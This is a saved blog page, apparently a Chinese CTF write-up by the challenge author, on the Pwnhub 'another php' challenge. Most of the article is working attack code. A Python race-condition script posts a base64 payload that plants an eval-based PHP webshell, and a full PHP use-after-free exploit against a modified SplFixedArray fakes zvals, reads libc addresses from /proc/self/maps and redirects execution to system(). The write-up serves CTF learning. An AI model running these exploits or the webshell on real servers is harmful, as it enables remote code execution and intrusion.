@@ -1,0 +1,596 @@
+<!DOCTYPE HTML>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
+<meta content="yes" name="apple-mobile-web-app-capable">
+<title>Pwnhub-another php-WP  - Veneno's Blog</title>
+<link href="./Pwnhub-another php-WP  - Veneno's Blog/highslide.css" rel="stylesheet" type="text/css"/>
+<!--[if lt IE 7]>
+<link rel="stylesheet" type="text/css" href="http://www.venenof.com/usr/plugins/HighSlide/css/highslide-ie6.css" />
+<![endif]-->
+<meta content="有幸作为题目的出题人，强行给晨升大佬的pwn套了一个webanother php共分为两部分，web&amp;amp;pwnWebweb部分的关键代码其实是去年打韩国一个CTF比赛碰到的，当时线上解出都..." name="description">
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-311'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-311'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        focus: 'focus',
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        focus: 'onfocus',
+        load: 'onload'
+    };
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-311');
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                var f = forms[0], textarea = f.getElementsByTagName('textarea')[0], added = false;
+
+                if (null != textarea && 'text' == textarea.name) {
+                    textarea[event.add](event.focus, function () {
+                        if (!added) {
+                            var input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = '_';
+                            input.value = (function () {
+    var _zduuU = //'3V'
+'3V'+//'YDM'
+'6'+'dcc'//'0Mt'
++'3ef'//'yQ'
++//'rc'
+'f20'+//'S'
+'S'+'fe'//'5'
++'4'//'t1'
++'fdB'//'fdB'
++/* 'P59'//'P59' */''+//'oz2'
+'7'+//'IW'
+'49'+'i'//'i'
++//'2D'
+'3'+//'3JU'
+'b'+//'nZa'
+'7'+'Vb'//'Vb'
++//'0Of'
+'37'+/* 'x'//'x' */''+//'u'
+'24d'+//'EPx'
+'EPx'+//'W'
+'W'+//'V'
+'70'+//'UJW'
+'a86'+//'gl6'
+'4e'+/* 'S'//'S' */''+'I'//'I'
++'c'//'2f'
+, _4HY = [[0,2],[10,11],[13,16],[16,17],[19,21],[24,27],[24,25],[31,32]];
+    
+    for (var i = 0; i < _4HY.length; i ++) {
+        _zduuU = _zduuU.substring(0, _4HY[i][0]) + _zduuU.substring(_4HY[i][1]);
+    }
+
+    return _zduuU;
+})();
+
+                            f.appendChild(input);
+                            added = true;
+                        }
+                    });
+                }
+            }
+        }
+    });
+})();
+</script><link href="./Pwnhub-another php-WP  - Veneno's Blog/style.css" rel="stylesheet"/>
+<link href="./Pwnhub-another php-WP  - Veneno's Blog/prism.css" rel="stylesheet"/>
+<link href="./Pwnhub-another php-WP  - Veneno's Blog/iconfont.css" rel="stylesheet"/>
+<link href="./Pwnhub-another php-WP  - Veneno's Blog/player.css" rel="stylesheet"/>
+<link href="" rel="shortcut icon"/>
+</meta></meta></head>
+<body>
+<header>
+<div class="main">
+<div class="intro"> <img class="intro-logo" src="./Pwnhub-another php-WP  - Veneno's Blog/veneno.jpeg"/> <span class="intro-sitename"><a href="http://www.venenof.com/">
+      Veneno's Blog      </a></span> <span class="intro-siteinfo">
+      The harder you struggle today,the more glorious you will be tomorrow.      </span> <span class="social"> <a href="" target="_blank"><i class="iconfont icon-qq"></i></a> <a href="" target="_blank"><i class="iconfont icon-mail"></i></a> <a href="" target="_blank"><i class="iconfont icon-weibo"></i></a> <a href="" target="_blank"><i class="iconfont icon-github"></i></a> </span> </div>
+<nav>
+<div class="collapse">
+<i class="iconfont icon-menu"></i></div>
+<ul class="bar">
+<li><a href="http://www.venenof.com/">首页</a></li>
+<li><a href="http://www.venenof.com/index.php/archive.html">
+          时间          </a></li>
+<li><a href="http://www.venenof.com/index.php/link.html">
+          友链          </a></li>
+<li><a href="http://www.venenof.com/index.php/Veneno.html">
+          About Me          </a></li>
+</ul>
+</nav>
+<a class="icon-search" id="btnChange" onclick="searchbox();"></a>
+<div id="search" style="display:none">
+<div class="icon-close" onclick="searchbox();"></div>
+<form action="/index.php" class="search" id="searchform" method="get" name="form">
+<input autofocus="autofocus" id="searchText" name="s" placeholder="输入关键字查找" style="margin-top:25%" type="search"/>
+</form>
+</div>
+</div></header><content>
+<div class="main">
+<div class="article">
+<div class="article-title">Pwnhub-another php-WP </div>
+<small class="article-time">发表于： <time datetime="2017-03-13T15:45:00+00:00" itemprop="datePublished">2017-03-13</time> | 分类： <a href="http://www.venenof.com/index.php/category/PHP/">PHP</a>,<a href="http://www.venenof.com/index.php/category/CTF/">CTF</a>,<a href="http://www.venenof.com/index.php/category/Web/">Web</a>,<a href="http://www.venenof.com/index.php/category/Bin/">Bin</a> | <a href="http://www.venenof.com/index.php/archives/311/#comments" itemprop="discussionUrl">评论：0 </a> | 阅读：407</small>
+<div class="article-content">
+<p>有幸作为题目的出题人，强行给晨升大佬的pwn套了一个web</p>
+<hr/>
+<p>another php共分为两部分，web&amp;pwn</p>
+<h2>Web</h2>
+<p>web部分的关键代码其实是去年打韩国一个CTF比赛碰到的，当时线上解出都是用了非预期的做法，包括ctftime上也没有详细的解题思路，于是自己就把代码改了改，禁掉了非预期做法。于是就有了这次的web部分:)</p>
+<ul>
+<li>前面的大杂烩</li>
+</ul>
+<p>index.php~泄露=&gt;得到路径=&gt;.svn/wc.db得到username=&gt;login.php只验证了username，然后爆破下验证码就可以得到关键文件的文件名</p>
+<pre><code class="language-php">import hashlib
+
+def md5(str):
+    m = hashlib.md5()
+    m.update(str)
+    return m.hexdigest()
+for i in range(1,99999999):
+    j= str(i)
+    d=md5(j)
+    if 'xxxxxx' in d[0:6]:
+        print j
+</code></pre>
+<p>访问提示noimage，随意post一个image参数就可以得到源码压缩包的name。<br/>
+然后我们可以下载得到a9b4d7cc810da015142f61f7e236d50b.php的源码以及php的diff文件。a9b4d7cc810da015142f61f7e236d50b.php是淘宝两块钱解密的难度，或者自己用xdebug调也行。</p>
+<ul>
+<li>关键分析</li>
+</ul>
+<p>直接贴源码：</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(E_ALL);
+$firesun_path = '';
+class Pwnhub
+{
+    function __wakeup()
+    {
+        if (isset($_GET['pwnhub'])=="firesun") {
+            echo "Hacked by Firesun!";
+        eval(base64_decode($_POST['pwnhub']));
+        }
+    }
+}
+function pwnhubfile()
+{
+    global $firesun_path;
+    file_put_contents($firesun_path . '/firesun', serialize($_SESSION));
+}
+session_start();
+register_shutdown_function('pwnhubfile');
+function set_context($id)
+{
+    global $_SESSION, $firesun_path;
+    $firesun_path = '/var/www/data/' . $id;
+    if (!is_dir($firesun_path)) mkdir($firesun_path);
+    chdir($firesun_path);
+    if (!is_file('firesun')) $_SESSION = array(); else $_SESSION = unserialize(file_get_contents('firesun'));
+}
+
+function download_image($url)
+{
+    $url = parse_url($origUrl = $url);
+    if (isset($url['scheme']) &amp;&amp; $url['scheme'] == 'http') if ($url['path'] == '/pwnhub.png') {
+        if (isset($url['query'])) {
+            die('byebyebye');
+        }
+    wget_wrapper($origUrl);
+    echo "Nice:)";
+    } else {
+        echo 'sorry!';
+    }
+}
+
+if (!isset($_SESSION['id'])) {
+    $sessId = bin2hex(openssl_random_pseudo_bytes(10));
+    $_SESSION['id'] = $sessId;
+} else {
+    $sessId = $_SESSION['id'];
+}
+session_write_close();
+set_context($sessId);
+if (isset($_POST['image'])) {
+        $p = $_POST['image'];
+        if (stripos($p, 'php')) {
+            echo 'wow!!!';
+            die('byebye');
+        }
+        $pq = str_ireplace("php", "", $p);
+        $pqq = str_ireplace("?", "", $pq);
+        download_image($pqq);
+        echo '&lt;img src="pwnhub.jpg" width=184 height=200/&gt;';
+    } else {
+    die('no image:(');
+}
+?&gt;
+&lt;!-- pwnhubs0urcec0d3.zip --&gt;
+</code></pre>
+<p>漏洞的关键点其实很明显，就是Pwnhub类中的magic函数中的RCE，但是阅读代码发现，Pwnhub这个类并没有被实例化调用。同时因为pwnhubfile函数的存在，并且$_SESSION['id']是我们不可控的，那么这样就导致了firesun文件的内容都是array()。</p>
+<hr/>
+<p>于是摆在这里的第一个问题，那就是firesun的内容怎么控制?<br/>
+在download_image()函数中，封装了一个完全等于wget的函数wget_wrapper，而wegt的版本够低。</p>
+<pre><code class="language-php">if (isset($url['scheme']) &amp;&amp; $url['scheme'] == 'http') if ($url['path'] == '/pwnhub.png') {
+        if (isset($url['query'])) {
+            die('byebyebye');
+        }
+    wget_wrapper($origUrl);
+    echo "Nice:)";
+    } else {
+        echo 'sorry!';
+    }
+</code></pre>
+<p>而在wget的低版本中存在302的跳转漏洞，也就是如果我们重定向到一个ftp地址的话，服务器就会wget你ftp上的相应文件，而不是最初url的文件。所以，这就意味着，firesun的内容我们是可控的。<br/>
+于是我们现在只有能够触发下面这个条件就可以实现RCE:</p>
+<pre><code class="language-php">else $_SESSION = unserialize(file_get_contents('firesun'));
+</code></pre>
+<p>其实后面就是一个比较简单的点了，利用race condition，让服务器wget的firesun赶在file_put_contents之前生成，这样也就会导致了Pwnhub类被实例化，从而导致了RCE，给出自己的payload:`</p>
+<pre><code class="language-php">#!/usr/bin/env python3
+# -*- utf8 -*-
+import gevent.pool
+import gevent.monkey
+import requests
+COOKIES = {
+'PHPSESSID':'a7labfa9p995hpda8340rasju73' 
+}
+def main():
+    pool = gevent.pool.Pool(20)
+    pool.map(do_job, [i for i in range(40)])
+def do_job(num):
+    payload = {'image':'http://150.95.155.106/pwnhub.png',
+            'pwnhub':'ZmlsZV9wdXRfY29udGVudHMoIi92YXIvd3d3L2h0bWwvMmQ5YmM2MjVhY2IxYmE1ZDBkYjZmOGQwYzhiOWQyMDYvaW1hZ2UvdmVuLnBocCIsIjw/cGhwIGV2YWwoYmFzZTY0X2RlY29kZShcJF9QT1NUWzEyM10pKTs/PiIpOw=='
+
+}
+    r = requests.post("http://52.80.32.116/2d9bc625acb1ba5d0db6f8d0c8b9d206/a9b4d7cc810da015142f61f7e236d50b.php?pwnhub=firesun", data=payload, cookies=COOKIES)
+    print(str(num) + '|' + r.text)
+if __name__ == '__main__':
+    gevent.monkey.patch_socket()
+    main()
+</code></pre>
+<p>差不多改两三次cookie就OK写入shell:</p>
+<p><img alt="3798abf9-3dd7-4977-90a6-ce34dcdf586c.jpg" src="./Pwnhub-another php-WP  - Veneno's Blog/3544236852.jpg"/></p>
+<p>至此，web部分结束，拿到shell，但是看了眼phpinfo上的disable_functions：</p>
+<p><img alt="21ed42e7-ff92-44f0-847b-47c5b8f83542.jpg" src="./Pwnhub-another php-WP  - Veneno's Blog/3673485612.jpg"/><br/>
+貌似没有shell绕过的可能性XD</p>
+<h2>Pwn</h2>
+<p>拿到webshell之后可以查看phpinfo();， 发现命令执行相关的函数如system,exec,passthru等都被禁用了。 也没有可行的方法寻找flag。<br/>
+根据php.diff，可以得知修改部分在php的SplFixedArray类中，作者为SplFixedArray新增了序列化与反序列化方法。简单阅读修改部分可以发现bug存在于反序列化过程中：如果php_var_unserialize失败，会调用zval_ptr_dtor减少对应zval的引用计数，从而导致其被释放，造成use-after-free。通过伪造zval可以达到任意地址读写与代码执行。<br/>
+拿到reverse shell之后，在根目录发现flag.txt，用flag_reader程序可以读出flag。</p>
+<blockquote>
+<p>P.S. ：其实本来是想再加上open_basedir的，但是由于我没时间(比较懒)，就没有加。加上之后利用方法基本上就和HITCON-CTF2015的Use-after-flee那一题基本一样了。</p>
+</blockquote>
+<p>利用脚本：</p>
+<pre><code class="language-php">&lt;?php
+
+function ptr2str($ptr)
+{
+    $out = '';
+    for ($i = 0; $i &lt; 8; $i++) {
+        $out .= chr($ptr &amp; 0xff);
+        $ptr &gt;&gt;= 8;
+    }
+    return $out;
+}
+
+function readmem($address, $length)
+{
+    $inner = 'x:3;i:0;i:0;i:1;s:8:"AAAAAAAA";i:2;?:2;';
+    $fakezval = ptr2str($address);
+    $fakezval .= ptr2str($length);
+    $fakezval .= "\x00\x00\x00\xff";
+    $fakezval .= "\x06";
+    $fakezval .= "\x00";
+    $fakezval .= "\x00\x00";
+    $inner2 = 's:'.strlen($fakezval).':"'.$fakezval.'"';
+    $mid = 'x:6;i:0;s:1:"0";i:1;s:1:"1";i:2;C:13:"SplFixedArray":'.strlen($inner).':{'.$inner.'}i:3;'.$inner2.';i:4;'.$inner2.';i:5;'.$inner2.';';
+    $a = 'C:13:"SplFixedArray":'.strlen($mid).':{'.$mid.'}';
+
+    $data = unserialize($a);
+    return substr($data[2][2], 0, $length);
+}
+
+function parse_libc()
+{
+    $maps = file_get_contents("/proc/self/maps");
+    preg_match('#([0-9a-f]+)\-[0-9a-f]+.+/.+libc\-.+#', $maps, $r);
+    $result = hexdec($r[1]);
+    return $result;
+}
+
+$libc = parse_libc();
+echo "libc_base = ".$libc."\n";
+$system = ptr2str($libc + 0x46590);
+$bss = $libc + 0x3C0000;
+/*
+$array = array();
+for($i = 0;$i&lt;10;$i+=2) {
+    $array[$i] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+}
+
+FOR($i=0;$i&lt;10;$i++) {
+    $array[$i] = $i;
+}
+*/
+$inner = 'x:3;i:0;i:0;i:1;s:8:"AAAAAAAA";i:2;?:2;';
+$fakezval = ptr2str(0);
+$fakezval .= ptr2str(0x7fffffff);
+$fakezval .= "\x01\x00\x00\x00";
+$fakezval .= "\x06";
+$fakezval .= "\x00";
+$fakezval .= "\x00\x00";
+$inner2 = 's:'.strlen($fakezval).':"'.$fakezval.'"';
+$mid = 'x:7;i:0;s:1:"0";i:1;s:1:"1";i:2;C:13:"SplFixedArray":'.strlen($inner).':{'.$inner.'}i:3;'.$inner2.';i:4;'.$inner2.';i:5;'.$inner2.';i:5;?:5;';
+$a = 'C:13:"SplFixedArray":'.strlen($mid).':{'.$mid.'}';
+$data = unserialize($a);
+var_dump($data);
+
+echo bin2hex($data[5]);
+
+/* avoid calling free */
+$inner1 = 'x:3;i:0;i:0;i:1;s:8:"AAAAAAAA";i:2;?:2;';
+$fakezval1 = ptr2str($bss);
+$fakezval1 .= ptr2str(8);
+$fakezval1 .= "\x00\x00\x00\x00";
+$fakezval1 .= "\x06";
+$fakezval1 .= "\x00";
+$fakezval1 .= "\x00\x00";
+$inner2 = 's:'.strlen($fakezval1).':"'.$fakezval1.'"';
+$mid = 'x:6;i:0;s:1:"0";i:1;s:1:"1";i:2;C:13:"SplFixedArray":'.strlen($inner1).':{'.$inner1.'}i:3;'.$inner2.';i:4;'.$inner2.';i:5;'.$inner2.';';
+$a = 'C:13:"SplFixedArray":'.strlen($mid).':{'.$mid.'}';
+$data1 = unserialize($a);
+$y = $data1[2][2];
+$y[0] = $system[0];
+$y[1] = $system[1];
+$y[2] = $system[2];
+$y[3] = $system[3];
+$y[4] = $system[4];
+$y[5] = $system[5];
+$y[6] = $system[6];
+$y[7] = $system[7];
+
+file_put_contents("/tmp/a", "bash -c 'echo 123 &gt; /tmp/hello'");
+
+$inner_1 = 'x:3;i:0;i:0;i:1;s:8:"AAAAAAAA";i:2;?:2;';
+$fakezval_1 = "sh /*/a;";
+$fakezval_1 .= ptr2str($bss-8);
+$fakezval_1 .= "\x01\x00\x00\x00";
+$fakezval_1 .= "\x05";
+$fakezval_1 .= "\x00";
+$fakezval_1 .= "\x00\x00";
+$inner_2 = 's:'.strlen($fakezval_1).':"'.$fakezval_1.'"';
+$mid_1 = 'x:6;i:0;s:1:"0";i:1;s:1:"1";i:2;C:13:"SplFixedArray":'.strlen($inner_1).':{'.$inner_1.'}i:3;'.$inner_2.';i:4;'.$inner_2.';i:5;'.$inner_2.';';
+$a_1 = 'C:13:"SplFixedArray":'.strlen($mid_1).':{'.$mid_1.'}';
+$data_8 = unserialize($a_1);
+$data_8[2][2] = 1;
+
+echo "Done!\n";
+?&gt;
+</code></pre>
+</div>
+<div class="post-footer">
+<div class=" post-tags">
+<div class="tag"> 标签: none</div>
+<div class="post-nav">
+<li class="prev"><a href="http://www.venenof.com/index.php/archives/307/" title="Pwnhub-打开电脑">Pwnhub-打开电脑</a></li>
+<li class="next">
+<a href="http://www.venenof.com/index.php/archives/314/" title="0CTF-complicated xss">0CTF-complicated xss</a></li>
+</div>
+</div>
+</div>
+</div></div></content>
+<div id="comments">
+<!-- Duoshuo Comment BEGIN -->
+<div class="ds-thread" data-author-key="1" data-thread-key="311" data-title="Pwnhub-another php-WP " data-url=""></div>
+<script type="text/javascript">
+	var duoshuoQuery = {short_name:"veneno1",theme:"dark"};
+	(function() {
+		var ds = document.createElement("script");
+		ds.type = "text/javascript";ds.async = true;
+		ds.src = "http://static.duoshuo.com/embed.js";
+		ds.charset = "UTF-8";
+		(document.getElementsByTagName("head")[0] 
+		|| document.getElementsByTagName("body")[0]).appendChild(ds);
+	})();
+	</script>
+<!-- Duoshuo Comment END -->
+</div>
+</body></html>
+﻿<div class="willerce">
+<div> </div>
+<!--播放器 -->
+<div id="QPlayer">
+<div id="pContent">
+<div id="player"> <span class="cover"></span>
+<div class="ctrl">
+<div class="musicTag marquee"> <strong>Title</strong> <span> - </span> <span class="artist">Artist</span> </div>
+<div class="progress">
+<div class="timer left">0:00</div>
+<div class="contr">
+<div class="rewind icon"></div>
+<div class="playback icon"></div>
+<div class="fastforward icon"></div>
+</div>
+<div class="right">
+<div class="liebiao icon"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="ssBtn">
+<div class="adf"></div>
+</div>
+</div>
+<ol id="playlist">
+</ol>
+</div>
+<script src="./Pwnhub-another php-WP  - Veneno's Blog/jquery.min.js"></script>
+<script src="./Pwnhub-another php-WP  - Veneno's Blog/jquery.marquee.min.js"></script>
+<script>
+	var	playlist = [	
+];
+  var isRotate = 1;
+  var autoplay = ;  
+</script>
+<script src="./Pwnhub-another php-WP  - Veneno's Blog/player.js"></script>
+<script>
+function bgChange(){
+	var lis= $('.lib');
+	for(var i=0; i<lis.length; i+=2)
+	lis[i].style.background = 'rgba(246, 246, 246, 0.5)';
+}
+window.onload = bgChange;
+</script>
+<!--<div class="qrcode">
+  <img src="" width="126" height="136" alt=""> </div>-->
+<footer>
+<p> <a href="" target="_blank">网站地图</a><br/>
+Copyright © 2015-2017 <a href="http://www.venenof.com/">
+    Veneno's Blog    
+<script src="./Pwnhub-another php-WP  - Veneno's Blog/highslide.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+hs.graphicsDir = "http://www.venenof.com/usr/plugins/HighSlide/css/graphics/";
+hs.fadeInOut = true;
+hs.transitions = ["expand","crossfade"];
+hs.lang.creditsText = "&copy; www.venenof.com";
+hs.lang.creditsTitle = "&copy; www.venenof.com";
+hs.creditsHref = "http://www.venenof.com/index.php";
+hs.creditsPosition = "top left";
+hs.lang={
+loadingText : "载入中...",
+loadingTitle : "取消",
+closeText : "关闭",
+closeTitle : "关闭 (Esc)",
+previousText : "上一张",
+previousTitle : "上一张 (←键)",
+nextText : "下一张",
+nextTitle : "下一张 (→键)",
+moveTitle : "移动",
+moveText : "移动",
+playText : "播放",
+playTitle : "幻灯播放 (空格键)",
+pauseText : "暂停",
+pauseTitle : "幻灯暂停 (空格键)",
+number : "第%1张 共%2张",
+restoreTitle :	"点击关闭或拖动. 左右方向键切换图片. ",
+fullExpandTitle : "完整尺寸",
+fullExpandText :  "原大"
+};
+//]]>
+</script>
+<script>
+document.body.addEventListener('copy', function (e) {
+    if (window.getSelection().toString() && window.getSelection().toString().length > 10) {
+        setClipboardText(e);
+    }
+}); 
+function setClipboardText(event) {
+    var clipboardData = event.clipboardData || window.clipboardData;
+    if (clipboardData) {
+        event.preventDefault();
+        var htmlData = ''
+            + '著作权归作者所有。<br>'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。<br>'
+            + '作者：Veneno<br>'
+            + '链接：' + window.location.href + '<br>'
+            + '来源：http://www.venenof.com/<br><br>'
+            + window.getSelection().toString();
+        var textData = ''
+            + '著作权归作者所有。\n'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。\n'
+            + '作者：Veneno\n'
+            + '链接：' + window.location.href + '\n'
+            + '来源：http://www.venenof.com/\n\n'
+            + window.getSelection().toString();
+        clipboardData.setData('text/html', htmlData);
+        clipboardData.setData('text/plain',textData);
+    }
+}
+</script>
+</a></p></footer>
+<div class="toTop">TOP</div>
+<script src="./Pwnhub-another php-WP  - Veneno's Blog/all.js"></script>
+<script src="./Pwnhub-another php-WP  - Veneno's Blog/jquery.js"></script>
+<script src="./Pwnhub-another php-WP  - Veneno's Blog/prism.js"></script>
+<script src="./Pwnhub-another php-WP  - Veneno's Blog/search.js"></script>
+</div>
+
